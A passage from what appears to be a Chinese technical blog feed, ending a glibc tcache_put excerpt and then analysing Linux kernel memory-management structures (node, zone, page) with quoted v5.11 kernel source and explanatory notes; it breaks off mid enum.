&amp;&amp; tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)      &#123;    tcache_put (p, tc_idx); //首先将其置入tcache当中    return;      &#125;  &#125;#endif </code></pre><hr><h4 id="题外话：tcache-put"><a href="#题外话：tcache-put" class="headerlink" title="题外话：tcache_put"></a>题外话：tcache_put</h4><pre><code class="hljs">/* Caller must ensure that we know tc_idx is valid and there&#39;s room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx]; //从头置入  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;</code></pre><hr><p>至此，个人所分析到的值得注意的差异就此结束</p><h2 id="0x04-glibc-2-32版本差异"><a href="#0x04-glibc-2-32版本差异" class="headerlink" title="0x04 glibc 2.32版本差异"></a>0x04 glibc 2.32版本差异</h2>]]></content>
    
    
    <categories>
      
      <category>Linux User</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>source</tag>
      
      <tag>user</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_memory_manegement</title>
    <link href="/2023/06/17/Linux-memory-manegement/"/>
    <url>/2023/06/17/Linux-memory-manegement/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux内存管理源码分析"><a href="#Linux内存管理源码分析" class="headerlink" title="Linux内存管理源码分析"></a>Linux内存管理源码分析</h1><p>内核pwn学到UAF，发现又不太行了，虽说之前操作系统的知识没啥问题了，但是这里对于目前市面上的内存管理还是不了解，因此在这里再来浅浅分析一下，整体的数据部分，Linux采用<code>node</code>、<code>zone</code>、<code>page</code>三级表示，接下来我们来分别叙述，这里若涉及到源码大家可以点击下面链接查看Linux内核相应版本查看</p><p><a href="https://elixir.bootlin.com/linux/v5.11.22/source">Linux 内核源码</a></p><p>本篇主要是个人跟随着arttnba3师傅：</p><p><a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">arttnba3</a></p><p>和cft56200_ln师傅：</p><p><a href="https://blog.csdn.net/caofengtao1314/article/details/117321692?spm=1001.2014.3001.5502">cft56200_ln</a></p><h2 id="1-数据结构部分"><a href="#1-数据结构部分" class="headerlink" title="1. 数据结构部分"></a>1. 数据结构部分</h2><h3 id="node节点"><a href="#node节点" class="headerlink" title="node节点"></a>node节点</h3><p>我们首先需要知道，对于内存访问架构来讲，一般CPU都可以分为以下两种方式：</p><ul><li>UMA(一致性内存访问，Uniform Memory Access)，表示全局就一个<code>node</code>，且多个CPU通过1跟总线访问内存，且访问时间一致，类似SMP</li><li>NUMA(非一致性内存访问，Not-Uniform Memory Access)，每个CPU分配一块内存，存在多个<code>node</code>，且再不同情况下使用访问时间有所区别。</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e84a7453394c8a786c8175c76.jpg"></p><p>而<code>node</code>的结构体是采用<code>pglist_data</code>结构进行描述，定义在<code>/include/linux/mmzone.h</code>,如下：</p><pre><code class="hljs">/* * On NUMA machines, each NUMA node would have a pg_data_t to describe * it&#39;s memory layout. On UMA machines there is a single pglist_data which * describes the whole memory.（NUMA架构每个node都有个此结构来描述内存布局，而UMA就一个） * * Memory statistics and page replacement data structures are maintained on a * per-zone basis. */typedef struct pglist_data &#123;    /*     * node_zones contains just the zones for THIS node. Not all of the     * zones may be populated, but it is the full list. It is referenced by     * this node&#39;s node_zonelists as well as other node&#39;s node_zonelists.     */    struct zone node_zones[MAX_NR_ZONES];    /*     * node_zonelists contains references to all zones in all nodes.     * Generally the first zones will be references to this node&#39;s     * node_zones.     */    struct zonelist node_zonelists[MAX_ZONELISTS];    int nr_zones; /* number of populated zones in this node */#ifdef CONFIG_FLAT_NODE_MEM_MAP/* means !SPARSEMEM */    struct page *node_mem_map;#ifdef CONFIG_PAGE_EXTENSION    struct page_ext *node_page_ext;#endif#endif#if defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)    /*     * Must be held any time you expect node_start_pfn,     * node_present_pages, node_spanned_pages or nr_zones to stay constant.     * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page     * init.     *     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to     * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG     * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.     *     * Nests above zone-&gt;lock and zone-&gt;span_seqlock     */    spinlock_t node_size_lock;#endif    unsigned long node_start_pfn;    unsigned long node_present_pages; /* total number of physical pages */    unsigned long node_spanned_pages; /* total size of physical page                         range, including holes */    int node_id;    wait_queue_head_t kswapd_wait;    wait_queue_head_t pfmemalloc_wait;    struct task_struct *kswapd;/* Protected by                       mem_hotplug_begin/end() */    int kswapd_order;    enum zone_type kswapd_highest_zoneidx;    int kswapd_failures;/* Number of &#39;reclaimed == 0&#39; runs */#ifdef CONFIG_COMPACTION    int kcompactd_max_order;    enum zone_type kcompactd_highest_zoneidx;    wait_queue_head_t kcompactd_wait;    struct task_struct *kcompactd;#endif    /*     * This is a per-node reserve of pages that are not available     * to userspace allocations.     */    unsigned longtotalreserve_pages;#ifdef CONFIG_NUMA    /*     * node reclaim becomes active if more unmapped pages exist.     */    unsigned longmin_unmapped_pages;    unsigned longmin_slab_pages;#endif /* CONFIG_NUMA */    /* Write-intensive fields used by page reclaim */    ZONE_PADDING(_pad1_)    spinlock_tlru_lock;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT    /*     * If memory initialisation on large machines is deferred then this     * is the first PFN that needs to be initialised.     */    unsigned long first_deferred_pfn;#endif /* CONFIG_DEFERRED_STRUCT_PAGE_INIT */#ifdef CONFIG_TRANSPARENT_HUGEPAGE    struct deferred_split deferred_split_queue;#endif    /* Fields commonly accessed by the page reclaim scanner */    /*     * NOTE: THIS IS UNUSED IF MEMCG IS ENABLED.     *     * Use mem_cgroup_lruvec() to look up lruvecs.     */    struct lruvec__lruvec;    unsigned longflags;    ZONE_PADDING(_pad2_)    /* Per-node vmstats */    struct per_cpu_nodestat __percpu *per_cpu_nodestats;    atomic_long_tvm_stat[NR_VM_NODE_STAT_ITEMS];&#125; pg_data_t;</code></pre><p>下面单独指出一些重要字段：</p><ul><li><strong>node_zones</strong>:node_zones contains just the zones for THIS node. Not all of the zones may be populated, but it is the full list. It is referenced by this node’s node_zonelists as well as other node’s node_zonelists.说人话，他是一个<code>struct zone</code>类型的数组，包含了仅仅这个<code>node</code>下的所有的<code>zone</code>,这里注意并非所有<code>zone</code>都被填充，但是他是已经被充满了，他被下面即将讲到的一个链表节点<code>node_zonelists</code>和其他<code>node</code>的<code>node_zonelists</code>引用；</li><li><strong>node_zonelists</strong>:不标英语了，看着烦人，这里我直接写他的含义，他的定义是为了确定内存分配的时候对备用<code>zone</code>的搜索顺序，他同时可以包含非本<code>node</code>的<code>zone</code>，普遍他的第一个<code>zone</code>链接的是本<code>node</code>下的<code>zone</code>数组第一个，其实这个<code>struct zonelist</code>就是一个指向<code>zone</code>的指针加上其他元素，我们可以看看他的数据结构，这里直接引用<code>arttnba3</code>师傅的笔记，</li></ul><p>如下：</p><pre><code class="hljs">/* * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表， * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。 * * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。 * 用来访问所给的 zoneref 结构体信息的帮助函数有： * * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index * zonelist_node_idx()- 返回作为 entry 的 node 的 index */struct zonelist &#123;    struct zoneref _zonerefs[MAX_ZONES_PER_ZONELIST + 1];&#125;;</code></pre><p>   其中是一个<code>struct zoneref</code>数组，接下来再看看其中的结构</p><pre><code class="hljs">/* * 该结构包含了 zonelist 中一个 zone 的信息。  * 其被储存在这里以预防对大结构体的解引用与对表的查询。 */struct zoneref &#123;    struct zone *zone;/* 指向实际上的 zone 的指针 */    int zone_idx;/* zone_idx(zoneref-&gt;zone) */&#125;;</code></pre><p>   可以看到其就是一个指针而已</p><ul><li><strong>nr_zones</strong>:记录了该<code>node</code>中所有可用的<code>zone</code>数量</li><li><strong>node_start_pfn</strong>：<code>node</code>起始页的页框标号，这里的<code>pfn</code>我们在之后讲解，这里可以理解为该<code>node</code>所在的物理地址</li><li><strong>node_present_pages</strong>：<code>node</code>中物理页的总数量</li><li><strong>unsighnd long node_spanned_pages</strong>:<code>node</code>中物理页的总大小</li><li><strong>node_id</strong>：记录该<code>node</code>在系统中的标号，从0开始</li></ul><p>知道了其中的一些数据结构，接下来我们了解一下<code>node</code>的存储方式：我们可以在上面的网站中查找源码，在<code>/arch/x86/mm/numa.c</code>中看到其中定义了一个<code>pglist_data</code>的全局数组<code>node_data[]</code></p><pre><code class="hljs">struct pglist_data *node_data[MAX_NUMNODES] __read_mostly;EXPORT_SYMBOL(node_data);</code></pre><p>其中包含我们的所有<code>node</code>,下面来一个好图，为啥大伙画图都这么专业捏<br><img src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fbada192ef28224f4a21a4dd90.jpg"></p><p>当我们知晓了<code>node</code>节点的存储方式，我们需要另一个数组<code>node_status</code>来描述对应<code>node</code>节点的状态，他定义在<code>/mm/page_alloc.c</code>当中，也是一个全局数组（我是真佩服写Linux的这一群大佬，这文件的分布情况跟我自己写的那个操作系统相比简直天壤之别阿）</p><pre><code class="hljs">/* * Array of node states. */nodemask_t node_states[NR_NODE_STATES] __read_mostly = &#123;    [N_POSSIBLE] = NODE_MASK_ALL,    [N_ONLINE] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifndef CONFIG_NUMA    [N_NORMAL_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifdef CONFIG_HIGHMEM    [N_HIGH_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif    [N_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,    [N_CPU] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif/* NUMA */&#125;;EXPORT_SYMBOL(node_states);</code></pre><p>而我们的<code>node_states</code>类型保存在<code>/include/linux/nodemask.h</code>,这里仍然直接引用<code>arttnba3</code>师傅</p><pre><code class="hljs">/* * 位掩码将为所有节点保存 */enum node_states &#123;    N_POSSIBLE,        /* 节点在某个时刻是联机的 */    N_ONLINE,        /* 节点是联机的 */    N_NORMAL_MEMORY,    /* 节点有着普通的内存 */#ifdef CONFIG_HIGHMEM    N_HIGH_MEMORY,        /* 节点有着普通或高端内存 */#else    N_HIGH_MEMORY = N_NORMAL_MEMORY,#endif    N_MEMORY,        /* 节点有着内存(普通，高端，可移动) */    N_CPU,        /* 节点有着一个或多个 cpu */    N_GENERIC_INITIATOR,    /* 节点有一个或多个 Generic Initiators */    NR_NODE_STATES&#125;;</code></pre><p>说完node，我来绘个图吧，这里老抄作业好像体现不出自己真正学到了东西<br><img src="http://imgsrc.baidu.com/forum/pic/item/4d086e061d950a7b0985aa0d4fd162d9f3d3c943.jpg"></p><p>我们将在之后一步一步慢慢完善这个图片</p><h3 id="zone区域"><a href="#zone区域" class="headerlink" title="zone区域"></a>zone区域</h3><p>同样的，先说其数据结构<code>struct zone</code>，他位于<code>/include/linux/mmzone.h</code></p><pre><code class="hljs">struct zone &#123;    /* Read-mostly fields */    /* zone watermarks, access with *_wmark_pages(zone) macros */    unsigned long _watermark[NR_WMARK];    unsigned long watermark_boost;    unsigned long nr_reserved_highatomic;    /*     * We don&#39;t know if the memory that we&#39;re going to allocate will be     * freeable or/and it will be released eventually, so to avoid totally     * wasting several GB of ram we must reserve some of the lower zone     * memory (otherwise we risk to run OOM on the lower zones despite     * there being tons of freeable ram on the higher zones).  This array is     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl     * changes.     */    long lowmem_reserve[MAX_NR_ZONES];#ifdef CONFIG_NUMA    int node;#endif    struct pglist_data*zone_pgdat;    struct per_cpu_pageset __percpu *pageset;    /*     * the high and batch values are copied to individual pagesets for     * faster access     */    int pageset_high;    int pageset_batch;#ifndef CONFIG_SPARSEMEM    /*     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.     * In SPARSEMEM, this map is stored in struct mem_section     */    unsigned long*pageblock_flags;#endif /* CONFIG_SPARSEMEM */    /* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */    unsigned longzone_start_pfn;    /*     * spanned_pages is the total pages spanned by the zone, including     * holes, which is calculated as:     * spanned_pages = zone_end_pfn - zone_start_pfn;     *     * present_pages is physical pages existing within the zone, which     * is calculated as:     *present_pages = spanned_pages - absent_pages(pages in holes);     *     * managed_pages is present pages managed by the buddy system, which     * is calculated as (reserved_pages includes pages allocated by the     * bootmem allocator):     *managed_pages = present_pages - reserved_pages;     *     * So present_pages may be used by memory hotplug or memory power     * management logic to figure out unmanaged pages by checking     * (present_pages - managed_pages). And managed_pages should be used     * by page allocator and vm scanner to calculate all kinds of watermarks     * and thresholds.     *     * Locking rules:     *     * zone_start_pfn and spanned_pages are protected by span_seqlock.     * It is a seqlock because it has to be read outside of zone-&gt;lock,     * and it is done in the main allocator path.  But, it is written     * quite infrequently.     *     * The span_seq lock is declared along with zone-&gt;lock because it is     * frequently read in proximity to zone-&gt;lock.  It&#39;s good to     * give them a chance of being in the same cacheline.     *     * Write access to present_pages at runtime should be protected by     * mem_hotplug_begin/end(). Any reader who can&#39;t tolerant drift of     * present_pages should get_online_mems() to get a stable value.     */    atomic_long_tmanaged_pages;    unsigned longspanned_pages;    unsigned longpresent_pages;    const char*name;#ifdef CONFIG_MEMORY_ISOLATION    /*     * Number of isolated pageblock. It is used to solve incorrect     * freepage counting problem due to racy retrieving migratetype     * of pageblock. Protected by zone-&gt;lock.     */    unsigned longnr_isolate_pageblock;#endif#ifdef CONFIG_MEMORY_HOTPLUG    /* see spanned/present_pages for more description */    seqlock_tspan_seqlock;#endif    int initialized;    /* Write-intensive fields used from the page allocator */    ZONE_PADDING(_pad1_)    /* free areas of different sizes */    struct free_areafree_area[MAX_ORDER];    /* zone flags, see below */    unsigned longflags;    /* Primarily protects free_area */    spinlock_tlock;    /* Write-intensive fields used by compaction and vmstats. */    ZONE_PADDING(_pad2_)    /*     * When free pages are below this point, additional steps are taken     * when reading the number of free pages to avoid per-cpu counter     * drift allowing watermarks to be breached     */    unsigned long percpu_drift_mark;#if defined CONFIG_COMPACTION || defined CONFIG_CMA    /* pfn where compaction free scanner should start */    unsigned longcompact_cached_free_pfn;    /* pfn where compaction migration scanner should start */    unsigned longcompact_cached_migrate_pfn[ASYNC_AND_SYNC];    unsigned longcompact_init_migrate_pfn;    unsigned longcompact_init_free_pfn;#endif#ifdef CONFIG_COMPACTION    /*     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions     * are skipped before trying again. The number attempted since     * last failure is tracked with compact_considered.     * compact_order_failed is the minimum compaction failed order.     */    unsigned intcompact_considered;    unsigned intcompact_defer_shift;    intcompact_order_failed;#endif#if defined CONFIG_COMPACTION || defined CONFIG_CMA    /* Set to true when the PG_migrate_skip bits should be cleared */    boolcompact_blockskip_flush;#endif    boolcontiguous;    ZONE_PADDING(_pad3_)    /* Zone statistics */    atomic_long_tvm_stat[NR_VM_ZONE_STAT_ITEMS];    atomic_long_tvm_numa_stat[NR_VM_NUMA_STAT_ITEMS];&#125; ____cacheline_internodealigned_in_smp;</code></pre><p>同样地，我们来了解其中比较重要的字段</p><ul><li><strong>_watermark</strong> 水位线，一般表示剩余空闲页框，他又三个挡位，分别是<code>WMARK_MIN</code>,<code>WMARK_LOW</code>,<code>WMARK_HIGH</code>，他存放在<code>_watermark</code>数组当中，进行内存分配的时候，分配器会根据当前水位来采取不同的措施，下面搞个图：</li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/38dbb6fd5266d016ce8f7ae1d22bd40734fa3561.jpg"></p><ul><li><p><strong>lowmem_reserve</strong>:当本<code>zone</code>没有空闲块之后，会到别的<code>zone</code>中进行分配，避免分配内存全分配在低端<code>zone</code>，而我们不能保证这里分配的内存是可释放，或者最终会被释放的，出现低端<code>zone</code>区域内存提前耗尽，而高端<code>zone</code>区保留大量内存，因此声名该字段来保留一段内存，而这里的<code>zone</code>区内存是其他<code>zone</code>不能打扰的</p></li><li><p><strong>node</strong>:标识该<code>zone</code>所属<code>node</code>，当然，这里只在<code>NUMA</code>启动，<code>UMA</code>中只有一个<code>node</code>，不需要这个字段</p></li><li><p><strong>zone_pgdat</strong>:标识所属的<code>pglist_data</code>节点，同上面的<code>node</code></p></li><li><p><strong>pageset</strong>：由于目前都是多处理器CPU架构，因此对于临界区的同步互斥访问就是一个严重的问题，而防止出错的办法之一加锁解锁十分浪费资源，因此每个<code>zone</code>当中都为每一个CPU准备一个单独的页面仓库，最开始<code>buddy system</code>会首先将页面放置在各个CPU独自的页面仓库当中，需要进行分配的时候优先从其中分配，其类型结构体位于<code>/include/linux/mmzone.h</code></p><pre><code class="hljs">  struct per_cpu_pages &#123;      int count;/* number of pages in the list */      int high;/* high watermark, emptying needed */      int batch;/* chunk size for buddy add/remove */        /* Lists of pages, one per migrate type stored on the pcp-lists */      struct list_head lists[MIGRATE_PCPTYPES]; //双链表指针数组，指向空闲页们  &#125;;  struct per_cpu_pageset &#123;      struct per_cpu_pages pcp;  #ifdef CONFIG_NUMA      s8 expire;      u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];  #endif  #ifdef CONFIG_SMP      s8 stat_threshold;      s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];  #endif  &#125;;</code></pre><p>  此结构是一个包括状态，他会被存放在每个CPU独立的<code>.data..percpu</code>段当中，下面再再再次引用<code>arttnba3</code>师傅的图，真的态🐂辣</p></li></ul><p><img src="http://imgsrc.baidu.com/forum/pic/item/902397dda144ad340c83614e95a20cf431ad853f.jpg"></p><ul><li><p><strong>zone_start_pfn</strong>：该<code>zone</code>的起始物理地址编号pfn(page frame number)</p></li><li><p><strong>spanned_pages</strong>：本<code>zone</code>区域中内存的<code>page</code>总数</p></li><li><p><strong>present_pages</strong>：本<code>zone</code>中实际存在的物理页框数</p></li><li><p><strong>managed_pages</strong>：本<code>zone</code>中<code>buddy system</code>管理的页面数量</p></li><li><p><strong>free_area</strong>：<code>buddy_system</code>按照<code>order</code>管理的页面，为一个<code>free_area</code>结构体数组，具体定义如下：</p><pre><code class="hljs">  struct free_area &#123;      struct list_head    free_list[MIGRATE_TYPES];      unsigned long        nr_free;  &#125;;</code></pre></li></ul><p>看图好吧,这个<code>order</code>起始就是伙伴系统中的对于不同大小页分配的请求大小</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec9b54b0de27d0f703908fc185.jpg"></p><ul><li><p><strong>flags</strong>：标识<code>zone</code>的状态</p></li><li><p><strong>vm_stat</strong>：统计数据，这里是一个数组，而数组大小取决于定义的枚举类型，如下：</p><pre><code class="hljs">  enum zone_stat_item &#123;      /* First 128 byte cacheline (assuming 64 bit words) */      NR_FREE_PAGES,      NR_ZONE_LRU_BASE, /* Used only for compaction and reclaim retry */      NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,      NR_ZONE_ACTIVE_ANON,      NR_ZONE_INACTIVE_FILE,      NR_ZONE_ACTIVE_FILE,      NR_ZONE_UNEVICTABLE,      NR_ZONE_WRITE_PENDING,/* Count of dirty, writeback and unstable pages */      NR_MLOCK,/* mlock()ed pages found and moved off LRU */      /* Second 128 byte cacheline */      NR_BOUNCE,  #if IS_ENABLED(CONFIG_ZSMALLOC)      NR_ZSPAGES,/* allocated in zsmalloc */  #endif      NR_FREE_CMA_PAGES,      NR_VM_ZONE_STAT_ITEMS &#125;;</code></pre></li></ul><p>讲完一般结构，这里需要注意，虽说我们的<code>node</code>节点中直接就是一个<code>zone</code>数组，但他们之间是有区别的，此在<code>/include/linux/mmzone.h</code>中有定义：</p><pre><code class="hljs">enum zone_type &#123;    /*     * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able     * to DMA to all of the addressable memory (ZONE_NORMAL).     * On architectures where this area covers the whole 32 bit address     * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller     * DMA addressing constraints. This distinction is important as a 32bit     * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit     * platforms may need both zones as they support peripherals with     * different DMA addressing limitations.     */#ifdef CONFIG_ZONE_DMA    ZONE_DMA,#endif#ifdef CONFIG_ZONE_DMA32    ZONE_DMA32,#endif    /*     * Normal addressable memory is in ZONE_NORMAL. DMA operations can be     * performed on pages in ZONE_NORMAL if the DMA devices support     * transfers to all addressable memory.     */    ZONE_NORMAL,#ifdef CONFIG_HIGHMEM    /*     * A memory area that is only addressable by the kernel through     * mapping portions into its own address space. This is for example     * used by i386 to allow the kernel to address the memory beyond     * 900MB. The kernel will set up special mappings (page     * table entries on i386) for each page that the kernel needs to     * access.     */    ZONE_HIGHMEM,#endif    /*     * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains     * movable pages with few exceptional cases described below. Main use     * cases for ZONE_MOVABLE are to make memory offlining/unplug more     * likely to succeed, and to locally limit unmovable allocations - e.g.,     * to increase the number of THP/huge pages. Notable special cases are:     *     * 1. Pinned pages: (long-term) pinning of movable pages might     *    essentially turn such pages unmovable. Memory offlining might     *    retry a long time.     * 2. memblock allocations: kernelcore/movablecore setups might create     *    situations where ZONE_MOVABLE contains unmovable allocations     *    after boot. Memory offlining and allocations fail early.     * 3. Memory holes: kernelcore/movablecore setups might create very rare     *    situations where ZONE_MOVABLE contains memory holes after boot,     *    for example, if we have sections that are only partially     *    populated. Memory offlining and allocations fail early.     * 4. PG_hwpoison pages: while poisoned pages can be skipped during     *    memory offlining, such pages cannot be allocated.     * 5. Unmovable PG_offline pages: in paravirtualized environments,     *    hotplugged memory blocks might only partially be managed by the     *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The     *    parts not manged by the buddy are unmovable PG_offline pages. In     *    some cases (virtio-mem), such pages can be skipped during     *    memory offlining, however, cannot be moved/allocated. These     *    techniques might use alloc_contig_range() to hide previously     *    exposed pages from the buddy again (e.g., to implement some sort     *    of memory unplug in virtio-mem).     *     * In general, no unmovable allocations that degrade memory offlining     * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())     * have to expect that migrating pages in ZONE_MOVABLE can fail (even     * if has_unmovable_pages() states that there are no unmovable pages,     * there can be false negatives).     */    ZONE_MOVABLE,#ifdef CONFIG_ZONE_DEVICE    ZONE_DEVICE,#endif    __MAX_NR_ZONES&#125;;</code></pre><p>这里x86分别32位与64位都会有所区别，如下：<br>在32位中，<code>zone</code>可以分为<code>ZONE_DMA</code>、<code>ZONE_NORMAL</code>、<code>ZONE_HIGHMEM</code>，他们分别对应的起始和终止地址为</p><p><code>ZONE_DMA</code>：0~16MB</p><p><code>ZONE_NORMAL</code>：16~896MB</p><p><code>ZONE_HIGHMEM</code>:896~…MB</p><p>以上前两种类型是线性映射，也就是这里是直接映射的，也就是说存在虚拟地址就是物理地址的情形，后面的高端内存是不连续的</p><p>在64位中有所区别，<code>zone</code>分为如下三种</p><p><code>ZONE_DMA</code>：0~16MB</p><p><code>ZONE_DMA32</code>：16~4GB</p><p><code>ZONE_NORMAL</code>:4GB~…</p><p>内核中取消了高端内存的概念，接着上面咱们画的图，这里我们把<code>zone</code>补上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13cef9dada9854564e93584b63.jpg"></p><h3 id="page页框"><a href="#page页框" class="headerlink" title="page页框"></a>page页框</h3><p>终于来到了咱们的页框，这里的<code>page</code>对应的是物理页框而不是虚拟页，注意漏。<br>他对应的数据结构是<code>struct page</code>，位于<code>/include/linux/mm_types.h</code>如下：</p><pre><code class="hljs">struct page &#123;    unsigned long flags;/* Atomic flags, some possibly                     * updated asynchronously */    /*     * Five words (20/40 bytes) are available in this union.     * WARNING: bit 0 of the first word is used for PageTail(). That     * means the other users of this union MUST NOT use the bit to     * avoid collision and false-positive PageTail().     */    union &#123;        struct &#123;/* Page cache and anonymous pages */            /**             * @lru: Pageout list, eg. active_list protected by             * lruvec-&gt;lru_lock.  Sometimes used as a generic list             * by the page owner.             */            struct list_head lru;            /* See page-flags.h for PAGE_MAPPING_FLAGS */            struct address_space *mapping;            pgoff_t index;/* Our offset within mapping. */            /**             * @private: Mapping-private opaque data.             * Usually used for buffer_heads if PagePrivate.             * Used for swp_entry_t if PageSwapCache.             * Indicates order in the buddy system if PageBuddy.             */            unsigned long private;        &#125;;        struct &#123;/* page_pool used by netstack */            /**             * @dma_addr: might require a 64-bit value on             * 32-bit architectures.             */            unsigned long dma_addr[2];        &#125;;        struct &#123;/* slab, slob and slub */            union &#123;                struct list_head slab_list;                struct &#123;/* Partial pages */                    struct page *next;#ifdef CONFIG_64BIT                    int pages;/* Nr of pages left */                    int pobjects;/* Approximate count */#else                    short int pages;                    short int pobjects;#endif                &#125;;            &#125;;            struct kmem_cache *slab_cache; /* not slob */            /* Double-word boundary */            void *freelist;/* first free object */            union &#123;                void *s_mem;/* slab: first object */                unsigned long counters;/* SLUB */                struct &#123;/* SLUB */                    unsigned inuse:16;                    unsigned objects:15;                    unsigned frozen:1;                &#125;;            &#125;;        &#125;;        struct &#123;/* Tail pages of compound page */            unsigned long compound_head;/* Bit zero is set */            /* First tail page only */            unsigned char compound_dtor;            unsigned char compound_order;            atomic_t compound_mapcount;            unsigned int compound_nr; /* 1 &lt;&lt; compound_order */        &#125;;        struct &#123;/* Second tail page of compound page */            unsigned long _compound_pad_1;/* compound_head */            atomic_t hpage_pinned_refcount;            /* For both global and memcg */            struct list_head deferred_list;        &#125;;        struct &#123;/* Page table pages */            unsigned long _pt_pad_1;/* compound_head */            pgtable_t pmd_huge_pte; /* protected by page-&gt;ptl */            unsigned long _pt_pad_2;/* mapping */            union &#123;                struct mm_struct *pt_mm; /* x86 pgds only */                atomic_t pt_frag_refcount; /* powerpc */            &#125;;#if ALLOC_SPLIT_PTLOCKS            spinlock_t *ptl;#else            spinlock_t ptl;#endif        &#125;;        struct &#123;/* ZONE_DEVICE pages */            /** @pgmap: Points to the hosting device page map. */            struct dev_pagemap *pgmap;            void *zone_device_data;            /*             * ZONE_DEVICE private pages are counted as being             * mapped so the next 3 words hold the mapping, index,             * and private fields from the source anonymous or             * page cache page while the page is migrated to device             * private memory.             * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also             * use the mapping, index, and private fields when             * pmem backed DAX files are mapped.             */        &#125;;        /** @rcu_head: You can use this to free a page by RCU. */        struct rcu_head rcu_head;    &#125;;    union &#123;/* This union is 4 bytes in size. */        /*         * If the page can be mapped to userspace, encodes the number         * of times this page is referenced by a page table.         */        atomic_t _mapcount;        /*         * If the page is neither PageSlab nor mappable to userspace,         * the value stored here may help determine what this page         * is used for.  See page-flags.h for a list of page types         * which are currently stored here.         */        unsigned int page_type;        unsigned int active;/* SLAB */        int units;/* SLOB */    &#125;;    /* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */    atomic_t _refcount;#ifdef CONFIG_MEMCG    unsigned long memcg_data;#endif    /*     * On machines where all RAM is mapped into kernel address space,     * we can simply calculate the virtual address. On machines with     * highmem some memory is mapped into kernel virtual memory     * dynamically, so we need a place to store that address.     * Note that this field could be 16 bits on x86 ... ;)     *     * Architectures with slow multiplication can define     * WANT_PAGE_VIRTUAL in asm/page.h     */#if defined(WANT_PAGE_VIRTUAL)    void *virtual;/* Kernel virtual address (NULL if                       not kmapped, ie. highmem) */#endif /* WANT_PAGE_VIRTUAL */#ifdef LAST_CPUPID_NOT_IN_PAGE_FLAGS    int _last_cpupid;#endif&#125; _struct_page_alignment;</code></pre><p>老样子，先解释关键字段</p><ul><li><p><strong>lru</strong>：最近未使用页这个概念在计算机组成原理或者说操作系统课程里面都会讲解，这里也就不过多描述，在linux内核当中，page通过该字段来组织成链表</p></li><li><p><strong>slab相关</strong>：用来存放<code>slab</code>相关成员</p><pre><code class="hljs">  struct &#123;    /* slab, slob and slub */              union &#123;                  struct list_head slab_list;                  struct &#123;    /* Partial pages */                      struct page *next;  #ifdef CONFIG_64BIT                      int pages;  /* Nr of pages left */                      int pobjects;   /* Approximate count */  #else                      short int pages;                         short int pobjects;  #endif                  &#125;;              &#125;;              struct kmem_cache *slab_cache; /* not slob */              /* Double-word boundary */              void *freelist;     /* first free object */              union &#123;                  void *s_mem;    /* slab: first object */                  unsigned long counters;     /* SLUB */                  struct &#123;            /* SLUB */                      unsigned inuse:16;                      unsigned objects:15;                      unsigned frozen:1;                  &#125;;              &#125;;          &#125;;</code></pre></li></ul><p>下面给出又一张十分详细的图，是由简·李奥师傅所作</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4ec2d5628535e5dd881a441633c6a7efcf1b62c1.jpg"></p><ul><li><p><strong>flags</strong>：表示该页所处在的状态，定义于<code>include/linux/page-flags.h</code>当中，他是一个枚举类型，如下：</p><pre><code class="hljs">  enum pageflags &#123;      PG_locked,        /* Page is locked. Don&#39;t touch. */      PG_referenced,      PG_uptodate,      PG_dirty,      PG_lru,      PG_active,      PG_workingset,      PG_waiters,        /* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */      PG_error,      PG_slab,      PG_owner_priv_1,    /* Owner use. If pagecache, fs may use*/      PG_arch_1,      PG_reserved,      PG_private,        